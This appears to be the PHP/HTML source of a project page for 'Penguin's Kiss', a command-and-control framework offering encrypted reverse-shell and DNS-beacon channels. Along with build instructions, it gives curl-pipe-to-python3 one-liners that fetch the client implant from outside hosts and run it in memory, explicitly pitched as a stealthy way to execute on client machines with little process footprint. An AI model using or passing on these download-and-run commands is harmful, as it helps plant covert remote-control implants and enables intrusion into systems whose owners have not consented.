<!DOCTYPE html>
<html lang="en">
    <head>
<?php
require('include/meta.php');
?>
        <title>Penguin&apos;s Kiss Command & Control Software | Penguin&apos;s Kiss</title>
        <link rel="canonical" href="https://c2.pkctl.org/" />
    </head>
<?php
require('include/header.php');
?>
                <p>Penguin&apos;s Kiss is command and control software designed to accomodate a large
                    number of clients and controllers at once. Multiple channels are available for
                    end-to-end encrypted delivery of shell commands, including direct TCP reverse
                    shell, DNS beacon, and beacon-triggered direct connection. All information is sent
                    encrypted, either by padded RSA or by one-time pad exchanged over RSA (this helps
                    to keep short data snippets responsive and avoid ballooning message size). In the
                    future, some work may be done to incorporate elliptic curve cryptography and
                    one-time session keys utilizing some symmetric cipher (likely AES).</p>
                <section id="download">
                    <h3>Downloading PK</h3>
                    <p>The quickest way to download is via the button in the top right. This will take
                        you to the latest release on
                        <a href="https://github.com/cflems/pk">GitHub</a>. You can also clone the
                        <a href="https://github.com/cflems/pk/tree/master">master</a> (pseudo-stable)
                        or
                        <a href="https://github.com/cflems/pk/tree/develop">develop</a> (unstable)
                        branches to receive feature updates before they are bundled into a full
                        release.</p>
                </section>
                <section id="build">
                    <h3>Building PK</h3>
                    <p>PK doesn&apos;t require much in the way of compilation, just bundling into a
                        single script that can be distributed or run. This functionality is written in
                        the makefile for easy access, so fetching and compilation should be as simple
                        as:</p>
                    <pre># or tar -xzf pk.tgz if you've downloaded an archive
git clone git@github.com:cflems/pk.git
cd pk
make</pre>
                    <p>Your built artifacts will be <code>pkcli.py</code> and <code>pkd.py</code>.
                        Building is required before PK can be run for the first time.</p>
                </section>
                <section id="precompiled">
                    <h3>Precompiled Client Scripts</h3>
                    <p>Since cloning and building the latest version isn&apos;t the stealthiest
                        procedure to execute on a client machine, prebuilt versions of the latest
                        client script will be hosted in the several locations and can be executed
                        without meaningful process footprint as follows:</p>
                    <pre>curl -s https://dl.pkctl.org/pk.py | ENV=... python3 -</pre>
                    <pre>curl -s https://war.cflems.net/pk.py | ENV=... python3 -</pre>
                    <p>You may wish to host your own, however, in order to tweak the default values
                        to your needs and avoid feeding them via enviornment variables.</p>
                </section>
<?php
require('include/footer.php');
?>
</html>
